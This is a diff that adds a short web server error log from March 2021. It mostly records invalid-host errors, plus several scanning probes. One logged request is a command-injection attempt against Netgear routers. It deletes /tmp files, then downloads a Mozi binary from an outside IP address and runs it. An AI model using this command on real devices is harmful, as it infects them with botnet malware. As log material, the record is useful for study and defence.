@@ -1,0 +1,19 @@
+ERROR|02/Mar/2021 10:50:06|exception|11451|140419708999424|Invalid HTTP_HOST header: ''. The domain name provided is not valid according to RFC 1034/1035.
+ERROR|02/Mar/2021 14:02:58|exception|11451|140419459446528|Invalid HTTP_HOST header: ''. The domain name provided is not valid according to RFC 1034/1035.
+ERROR|02/Mar/2021 15:52:03|exception|20104|139701571790592|Invalid HTTP_HOST header: ''. The domain name provided is not valid according to RFC 1034/1035.
+ERROR|02/Mar/2021 16:14:51|exception|20104|139701176489728|Invalid HTTP_HOST header: ''. The domain name provided is not valid according to RFC 1034/1035.
+ERROR|02/Mar/2021 18:48:30|exception|20104|139701580183296|Invalid HTTP_HOST header: ''. The domain name provided is not valid according to RFC 1034/1035.
+ERROR|02/Mar/2021 19:08:58|exception|20104|139701580183296|Invalid HTTP_HOST header: ''. The domain name provided is not valid according to RFC 1034/1035.
+ERROR|02/Mar/2021 21:53:27|exception|20104|139701193275136|Invalid HTTP_HOST header: ''. The domain name provided is not valid according to RFC 1034/1035.
+ERROR|02/Mar/2021 23:15:11|basehttp|20104|139701193275136|"GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://90.117.140.85:39235/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 HTTP/1.0" 500 59
+ERROR|02/Mar/2021 23:44:00|exception|20104|139701193275136|Invalid HTTP_HOST header: ''. The domain name provided is not valid according to RFC 1034/1035.
+ERROR|02/Mar/2021 23:58:18|exception|20104|139701193275136|Invalid HTTP_HOST header: ''. The domain name provided is not valid according to RFC 1034/1035.
+ERROR|03/Mar/2021 00:01:43|exception|20104|139701193275136|Invalid HTTP_HOST header: ''. The domain name provided is not valid according to RFC 1034/1035.
+ERROR|03/Mar/2021 06:03:59|exception|20104|139701580183296|Invalid HTTP_HOST header: ''. The domain name provided is not valid according to RFC 1034/1035.
+ERROR|03/Mar/2021 06:34:27|exception|20104|139701580183296|Invalid HTTP_HOST header: ''. The domain name provided is not valid according to RFC 1034/1035.
+ERROR|03/Mar/2021 06:35:11|basehttp|20104|139701580183296|"GET /config/getuser?index=0 HTTP/1.1" 500 59
+ERROR|03/Mar/2021 08:05:14|exception|20104|139701580183296|Invalid HTTP_HOST header: ''. The domain name provided is not valid according to RFC 1034/1035.
+ERROR|03/Mar/2021 08:05:14|basehttp|20104|139701580183296|"GET /manager/html HTTP/1.1" 500 59
+ERROR|03/Mar/2021 11:43:03|exception|20104|139701580183296|Invalid HTTP_HOST header: ''. The domain name provided is not valid according to RFC 1034/1035.
+ERROR|03/Mar/2021 13:38:29|exception|20104|139701580183296|Invalid HTTP_HOST header: ''. The domain name provided is not valid according to RFC 1034/1035.
+ERROR|03/Mar/2021 13:38:30|basehttp|20104|139701580183296|"GET /manager/html HTTP/1.1" 500 59
